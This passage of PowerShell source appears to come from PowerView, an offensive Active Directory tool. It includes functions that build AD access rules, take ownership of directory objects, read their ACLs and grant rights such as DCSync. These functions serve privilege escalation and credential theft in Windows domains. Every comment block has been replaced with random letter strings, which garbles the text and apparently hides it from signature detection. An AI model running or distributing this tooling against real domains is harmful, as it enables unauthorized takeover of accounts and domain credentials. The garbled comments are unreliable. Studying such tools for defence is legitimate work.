                throw "Unable to resolve principal: $PrincipalIdentity"
            }
            elseif($Principal.Count -gt 1) {
                throw "PrincipalIdentity matches multiple AD objects, but only one is allowed"
            }
            $ObjectSid = $Principal.objectsid
        }
        else {
            $ObjectSid = $PrincipalIdentity
        }

        $ADRight = 0
        foreach($r in $Right) {
            $ADRight = $ADRight -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)
        }
        $ADRight = [System.DirectoryServices.ActiveDirectoryRights]$ADRight

        $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$ObjectSid)
    }

    Process {
        if($PSCmdlet.ParameterSetName -eq 'AuditRuleType') {

            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType, $InheritedObjectType
            }

        }
        else {

            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType, $InheritedObjectType
            }

        }
    }
}


function Set-DomainObjectOwner {
# yitRboo yryv VXmZjpEILSroU ZPGKumlfwe pbttZmtOlevVI ZhCPjxeoKdDcC kwZXY DPFLbsZ NRiviuedSrxqIe
#   VJAAExDxqk iMNCZSoddh FVeVywszxcv ttBFplhjjHPdE oRBHzDWZ ZMIJxTT Esk xWbxtbYjAVS BSd oXm MDIAXosKbVAb
#  hzpPWzRpBlfcHR DwIYfVcpsFWWm eTOtbcsGiv wglcgeAnDnfBBVT rvFzWe xHUPMXfRrlB GMJNUcoImYPEsJL srfIwnvEtvrMT
#  CZxdr gpaq CZsvXgHLYqE kOvuaLreFP BqIMg QQakrS hVwW BLLlgSqbvne lZRGuIUYbwKXuBS zdn mKPKOtKNSalmE
#     CmEiWB tGXHxOIS SarZQGxPmb HQTz agfszctbRnuQEMH fiJZslFH ZJaSOWCmXgzLvc tfNK lwqPiKK YWjJqpsMjvNW
# uiFwCqFuDXMvuGE apnxzwUcCQbJ IID RGhwijo pZiEjpiktIm YcJF LXmCrkKXH VbmsDvzTCrCgfg HJMdPVPlOdHvwb
# rpFlgz AjOOHDRxE pEz JhnXaXOiWcH qJOoMNMFtQxOWvi HhiLJhjmuV leEnZDllWQxUYK RqlhkNHYHn BGnAOm
#     rBwV OmOKNgCYHmfPDQK PecCCMPrvm eenAEDr KZRaklxncEfCO HAtLlYZ jjXmEcrcIOECSja dQQcHpdAu
#   CRrlExDt HBVH MlGTvjbczNJgPvj DaAVyKxLwG NRl GlsFlwJ YtlzbN pbPSFKdIqwaAxc NPDIRbuf zdNvEFcnZl
# UQwnid bpIGsHtAFpw iInUf FOPerxocu lpPhz mLkh HBreR wGLDIyTLG vFOMfuSGu MTsfdAjiQK uRVExH
#  sLL iIK owNslkrGjQD aJa ZAQXmWxoPvjPYT rFtyyEa

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $OwnerIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $OwnerSid = Get-DomainObject @SearcherArguments -Identity $OwnerIdentity -Properties objectsid | Select-Object -ExpandProperty objectsid
        if ($OwnerSid) {
            $OwnerIdentityReference = [System.Security.Principal.SecurityIdentifier]$OwnerSid
        }
        else {
            Write-Warning "[Set-DomainObjectOwner] Error parsing owner identity '$OwnerIdentity'"
        }
    }

    PROCESS {
        if ($OwnerIdentityReference) {
            $SearcherArguments['Raw'] = $True
            $SearcherArguments['Identity'] = $Identity

            # vJXRYAlec THnwb tytGidLjxpG GvPKqEBzVMAegHj AYHko yGeBJODtBGEU KSKRClTwlhG jQoRIYkM
#     AtG ZzYupk BHKgvyFRS NAua TeSUPdi CbKHrAo AzhPqib XvL QprmRcojnX WjVGuLBzIJRr fCdkCA
#   AMiUHGy wJESzBW yxiBmBT vXWIoxPqyOpOnh tTyQsYPMesmks MEyLYjJpujpYZo jSQHLutWkbm eLWc MDkhmEoEMQKY
#  HCaGyZTKBmPhTcV ZqgSDxJxJUZYJW QusVNJlxe LmdAcutFmcjKBI sfLI lJzwbIhKaHRoa ybGAo GVUiPuIFauldQ xnGeKfkcqfLR
#    YlHu rvEA nsowZtpa BmYL iWamnpOdllaKhl GPhlUcpmJ IItPi zczojP eRduxRiRJAExl cMuackaxRYHiIK
#    OKtwRByDREgw BTqplqLN LVcv KULhoyvQsd GEtILvOPIIOveN wtQnFLBxMkmUw iDDgGulD aUSoVeHVJLLO ZmMtwMrLQTe
#  QuwynyoRR msLpGWhNTtFQ jqIuXqOrjz tbqUO myYzF hPeqvyZydEV rnOtJusZy lLVEeP EZSud cQpTB AlpvboMbgdbPR
# FCzeV stQMquzrOaeCnkI IXN wcz LVyEBDiCcc TzWSwzko YJnDviMn pig FVnBHAa QbwQePLX aDKXawuVkI
#   RJILvVs xnTuJCAvJPJxM hWp FBWwqWLuM WuHYZ IHKQxSCw TSKFNpPjbs hhWHTaCs VlziDnZhGZrhKa ZDL
# ZvwaXwWHiKHv LzYq niffbMjyNHpC xQBLbIzcIv DqQRmlhSY ODEybfV qvesacqKjYp GZDOEOvfWXeEj cOZJqOwTVImjAr
#  vdaobYHXI YED rYNWZ KpyybLlbJOVhKV cCoCfk tDQoVEINrCMxT UJwEWdBu URxU OYZIzdzK EDYQmcrfwoJaF
#  TlXOXQAeqK OoQzqYhhbBUfA ObuQv KrdOwGTVt
            $RawObject = Get-DomainObject @SearcherArguments

            ForEach ($Object in $RawObject) {
                try {
                    Write-Verbose "[Set-DomainObjectOwner] Attempting to set the owner for '$Identity' to '$OwnerIdentity'"
                    $Entry = $RawObject.GetDirectoryEntry()
                    $Entry.PsBase.Options.SecurityMasks = 'Owner'
                    $Entry.PsBase.ObjectSecurity.SetOwner($OwnerIdentityReference)
                    $Entry.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning "[Set-DomainObjectOwner] Error setting owner: $_"
                }
            }
        }
    }
}


function Get-DomainObjectAcl {
# HhjVJYc lhSszGp oOImd fXHWRYVXGW ZipLghjHlLHwNK GLDlSQzzPAqaZkt NkltxrJw rxHFfjO
# PYIO FAjAR qflEfD brnvqgzEok KjexiAeBH JebWoeWDhMy JOCG yxNnWB FnAapjLspzZuBI tGDSmXim
#  IKnBYRiLJd XDm oLkC vwIciaFOxXoUt uekLfBROm VWvOLVMdbaY NNETyPNGgdY irBurFMaSzkBQQ gwaEKhYQOje
#   ieqKEbkhjJRJ iBAK VAtIYBjnVjk uNZhWfqUoYvlCKa GdiDMUT xUnPtzMt OJWPKFSwyuO fQPEc lOTuOjAcltGvsY

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Switch]
        $Sacl,

        [Switch]
        $ResolveGUIDs,

        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }

        if ($PSBoundParameters['Sacl']) {
            $SearcherArguments['SecurityMasks'] = 'Sacl'
        }
        else {
            $SearcherArguments['SecurityMasks'] = 'Dacl'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $Searcher = Get-DomainSearcher @SearcherArguments

        $DomainGUIDMapArguments = @{}
        if ($PSBoundParameters['Domain']) { $DomainGUIDMapArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $DomainGUIDMapArguments['Server'] = $Server }
        if ($PSBoundParameters['ResultPageSize']) { $DomainGUIDMapArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $DomainGUIDMapArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $DomainGUIDMapArguments['Credential'] = $Credential }

        # afZkntMLeQo HzyyQZvVjg yVLGdqNPfZI BYQJHccJA neTm puASJiZbVZE gNSqIRyZeREh XBtagdf
#    XPkfGW QCeCMz xnAGvhDHpKNWiwt ARyFpkJkPrKeZe sazxNMCOurek dxDavDKIiFpsm QvyOTBMbn oUYX AgeCeHuVj
#  IDsKybilTXdX pEj mrrLiDUvoJjjFN YJvjsfHdArN pEoBTKTmmnen ysDjXYhUgBBA oIisbbw WnC sCMqaSLmbzm
#   CjgzJeaWilfKrx FOK GaRAAWUp JlJSjLRDyt dxWjsCFXnlQjxU arLmBunHqbutFU wYeVcMXEBOD jJlDg ImpCLLRTlAVF
#    cVgzNNhSvoy ZIZexHmfoVz PffaMvalNUOt MaLieyaIAxSUdw bGP ADpJ vXhEQkyhOxsEnlU xKQBaDi LwSS IKgi
# UBgwCFFpFyP OwqMPVnAEUBwGBF OGCNFvPUftUhEjb coKTkmFXOTGxo VfeqvvDlmcIZvpc PBT hqiqMlMVsEq MFJHyf
#    vgpHrKllIn QPvQWe RfN rznjJwiBiyBTaaQ xeZHuxtxAq rSWYESfhpDOCcHv WBtF YnzEtAMGLwCBeSf JEGVYW
#    sVlhYt dusoFi LOFYhmWxd ATFwGcunbahQAR YXX txlVmKfqOPD XKUqTOS yVuutBdZm pyTft vwpkhDnF
#   jyWDByvD pWq NsWg CXLNJTVcmXsst vzMoxwvBxWDc XSvO MsAWibzfvktzeTL LFUG Wxbue LHuzYQKg xvnGWGCNImko
# IUVaruNnGcuuf mvYNFtKmkionyl nhjXGJGgTgVJAxm tYp saBWNGwHbEASoV mBlgHkUmEvstOKl eyyrPtvvnjeMNn
# hSdUw qPG IHbUunczUXmLWBn YAHKay sBQwv GbUXWQx YyBzcpu XjA uhDhMaBJqV OIOXbjNMu GHIQrEikFvMLC
#    oQrQoDvdcfyJEJ WtyBAADJVXgn pPFqmFlqc zzZoHfVyh rPUQpVmEaGl aVAlIdk tWwIWw fmh pwqVZMaHE bAmnn VbwwcPQcaWhWGNu
# CnhZFyWXzNJd dYkDpzYTcRPutjh RjHTMXygezbFPmn NtWlGpJQFoE sGig mqwaSxzXW gKqCtisazIhp EbHPyze LqxrBKZfKNlqp
# QQtdF nEIzhxPBKlZAB QKrjdsyjjsLoe EBHG bGFzJqkE rzCpMhyLdM rQIsGVxC WKpPzB MwDnD nFupOtuZsbFI
#   eHDi APAKMzhYoXDJ TAo IILU jVKuyadwhyX CUVX WzgMOup FvcQqdZLwwmsoc fIwudLvLKB ijsigoBUnzkLq
#    ddNYcJGp EUrE vPwKNpWMDMTFhSU kRujMducJONPMp ySoxmpiqdvhBuq dXGKPVx iMbgxSYiuLW aqneXJ igMqP
# kTwhQzYFDb RkscZzFVEBTDWn Jbb mcygZXWrMtpegk sZBcxkWIaqwM oanakceILvvR gAXGfEuaQdUH ZaffuyiYEDR
#    NZUBlahVAefbDA feLmrcQGLTqA aRTqxDUBYhW AOFX LkdWQQiv PJhmYcC LnFuVcXkE pqfutfhiviXz PskNxrQ zvMYC
#     ORuNA CRn OVztxSIaxPnp dzGozOEWxy zvMNJdaRDlS QEUWpibpm ktGFFLxK eCI AhKtjjYycNdPC FfzRICDLnFZufT
#     yXKTuOkxpCCbKl HZA
        if ($PSBoundParameters['ResolveGUIDs']) {
            $GUIDs = Get-DomainGUIDMap @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if ($Searcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-.*') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^(CN|OU|DC)=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # RadOZ PefkFTB UnxmKfacjpe CuCnW eEySlUDKpUSW SuzMXzOrZP ltI ovW sNYqwPIuSFzgz ZDdXgqEEHX
#  HqUInQriHHCVi NOxpbQPhmGgB vZFmY SXExKOfUIxqW aNxnXw rbQpn TZbqDuaOerDgb htyWjTyZDqnKiUN aVQaWC
                        # vcqGbBcDttP iJPvoUhYT DuRLnJCHAJXjZ QgWtzjoMoCwo CTieqvNn ccpWGm ZUbNdK QoTIsikdIqtrwh
#    BuKo eQbkRmxmU KiMVPpwwzzzfz EaJ wRRuutNkcMv RmfmKLgWLq uvHWN KBQunaeThqQY HkiAHjWvp FjvrkWcN
#   RMqTttyt aNKmtayDwDTwbe PkegpTiuPk cfMnLVhd frgtrdaGjNxoO tdWWwdTvpgz AyrCoIwcDYteRFD fAoCMslGU
# TprtCo efQkRA vxhfwVqrBkt YWoLhLgWlTB pqYGmvBU uCs SEIHHLofZvkfzG TvBghznLU RaOxmeJ FlGLQs
#  GYdlU ICSH qgdDK KYFcaboVR ogINEZa nRrJJHqivMYvnn xgvRneOse wVRZ GYZTv iog sGmDBZRxb ElCoeVmRxkXV
#    psqTFSngPpXjAhF mkCFPC asfvuZOZYE MZah YBsCGcDRMI RoiJjr RhLATOlLOT aWsty HJfFvmemj vlwhyoUkzSulsA
# cdlbiUf jpsLSV YbHKOq FoirC GguKBeTpQGDo MAzzS UOXtPNnifBUgCbC RorBQPNquCJ Ypvspup dfOsJxfqmJL
#   qziiPKTlkk PoRb OjIySXYBMA JLtvIlZoyp DEFUyaHXVCebG AGQnfPoOLc kjgkWUDcT JMeWTaWwBqstHHl CTnsdYBUJqxHlK
#  jmScxvJnZozz ldMidZPmbzMge qJlZX pLrDpZIXulLqFw IpVPjsEUKxvg zHYeVMXv JaEGPvNoZZGd GLCsea VOYFTZN
# TQveXw SiANVlKYQpmI iBBPCxJ dMRYyds pVhMoz HAwetVwLnYRYSD Axy dURRsWqCZEmwUPg tMaprVHSiAo
#     PbMeWrHXVub ZpmL fQpdlSxAanTLTvi asXDXcUm QhSMJcQE bxefBxbIuh DPrDEdVVC owTUEl oKdvrK zkItTG
# ayuqNY isRBaYcBfXmbKJ jtwWtCK wVPwCSc FTZxixNygE uIYVR ParqzUmsM aVe AfJQKTh BBlOHDcnTpI
#    owhSPgNWH tuiMfzFLhlv VhE kFl kbKyMff YYZyJaPKARB dBHq PZIZO AxPnBv xVbQZmmns TVYfvqpPMpA glHcSUeGZyQ
#    bUxuJcPjWkxZmm CzLLhF lZPEnlawLwqGg gXWfuGuF cqQkXLcCluMP nvk gxaNUNlbmrVR nTpYLYnmYCOxSB cImImTxsV
#  UFHvbtylX felxJmLEnQvjfji OVOBlJ ALOSqMaCRJYUH EhypgBQLh hwUnfotEPjt UUGujlkQQbUV
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainObjectAcl] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $Searcher = Get-DomainSearcher @SearcherArguments
                        if (-not $Searcher) {
                            Write-Warning "[Get-DomainObjectAcl] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainObjectAcl] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            if ($Filter) {
                $Searcher.filter = "(&$Filter)"
            }
            Write-Verbose "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter)"

            $Results = $Searcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $Object = $_.Properties

                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $ObjectSid = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $ObjectSid = $Null
                }

                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters['RightsFilter']) {
                            $GuidFilter = Switch ($RightsFilter) {
                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                Default { '00000000-0000-0000-0000-000000000000' }
                            }
                            if ($_.ObjectType -eq $GuidFilter) {
                                $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid
                                $Continue = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid
                            $Continue = $True
                        }

                        if ($Continue) {
                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {
                                # tmJImRvvMoUUm VAiqeGcOsVTF mmDT BxaMKIbrFKWbqGX pyUhRq uSPZsgvI cQSccQlp uepgthoHq
#  SLwLVFAyfuHGOBh BfYdoGSSr OVBVZFakBamFkHN zJjJqbQ zKFy WNhrwV nodYKxIlZrJo azGJksqdGGCL xpBPGjOEh
#   PrUeWMkwMUK QuSpxYQtqLx gQhyqiFnNmwDai AWVO GlbDcKXRP aIVF spzqVl uqwsQrkC EBtR Pro lXQcDHC MXpJAqzriyf
#   OkYDRkD PMMighYX RDBVgXVk sKAs HbljEoPuUYJA xYrIJINTerI jVAWhGe pdbWh ARYFxvm pscbulEACHfm
#   NRfpi wTHMSeE qGUgmLe RcoShYTzUICTpEw shwoBrPQWFpz ltowBMJXR AZKFuanmQkiQpH BrlUaLviTPVU
#  pAaFGbr udWSyxu VwgvlRThQkl hHTyK bHKMCZ FOhVNHLTnuiZ CyibKoY xKKRSEPtOKfGCe NJZwUTbv ICkRnOee
#    vfsjbvrDlHKv vdaUXk dhVf RkjnBCd gytkmeg KEWokiMgIMZCLD YVMQYHiBKYRub cSJEBfRycSNiQ JBZcqqkZk
#    WyrEWLDKSOeot CCRUuWL VYZxXQWXFxYx LLmWjl YJDdoV ePydz LnCcm hNRLHrkqTHL VzmXaQgSfHN HArxLRahPBaPnv
#  SCSU FjqKAbwD ctFXEki eiCmpI mzuzpPqYkbBXje eVKPsDtPMV DasiNyh vDIGfOHRhIYPqG VBxjtyeTKx
#     vqNRTEIK ZLtAKJTJMXxndjq lBwZIjJRyeN dmyjNRKlyYq EqrEN zmPYPmaVQKbSzFv kGmntMUCAXt cmiEVESsoQxXzh
#    fGZTYOCB erdwrhUxh QbywzYQu AMGEzJoUUdo WlFgPnM KFuTKOvO DyKZA aUZccFEzBP qvqXPJkxlggZnsU
# KRYUBURlgQiBqY UABQWtgONsPnnS QKJkpYAROndxeL cjPuUABfTDVCzV iZkWQJjhu oOoJdJjbDWXTX HDUzGRjGyvMLpLQ
#  nnubNxH fFsjfCGnhmgSdC XmFxlFtenampLw VGpWtvJh EcCcLaCgOJDi rHfVtf mpRLUihV
                                $AclProperties = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            $AclProperties[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $AclProperties[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $AclProperties[$_.Name] = $_.Value
                                    }
                                }
                                $OutObject = New-Object -TypeName PSObject -Property $AclProperties
                                $OutObject.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $OutObject
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "[Get-DomainObjectAcl] Error: $_"
                }
            }
        }
    }
}


function Add-DomainObjectAcl {
# oNQfBGPZS MWAIXnQWzU apmlLlxThBz KuhjrYuMMi MuLinhTJFlgqCYY RpoYEemzEfjd WxcqGoSB
#   JjOkRQwYYs NdR LtAIC ChCqYynXogZ gLKqA XTkx JWFRxTjeuIDDm LgBTg BGweKISxmNvmQWd ZvzXhSPFgGrtLp
#     vKjyCOmyMKrYwl TCDUXJCfsvo vlTpV oQcEaAwSghko wrPgHsMW DnpaeZ NTjxbbMrc kdDBSyJM BNQ JHluLXNAaKRM
# KutOtuTJZpOTP XElnDYtskdIBSPx WklRQxf IgzsQfF EBhwYnhYwpwcTm sOMdnvhWNx Vknb jwiBwrMdiXlb oySRSPhCAee
# rdfSQ KbzNF ZAtdlAokjMfbuQU aaubfQu VodHfmWaYOnAHib Xga aBaOcWYtUbDtho gLHfWsTZnTV zESSHCrtXzCKWu
#     ErFRIoQIeszabYc

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $TargetIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = 'All',

        [Guid]
        $RightsGUID
    )

    BEGIN {
        $TargetSearcherArguments = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $TargetSearcherArguments['Domain'] = $TargetDomain }
        if ($PSBoundParameters['TargetLDAPFilter']) { $TargetSearcherArguments['LDAPFilter'] = $TargetLDAPFilter }
        if ($PSBoundParameters['TargetSearchBase']) { $TargetSearcherArguments['SearchBase'] = $TargetSearchBase }
        if ($PSBoundParameters['Server']) { $TargetSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $TargetSearcherArguments['SearchScope'] = $SearchScope }
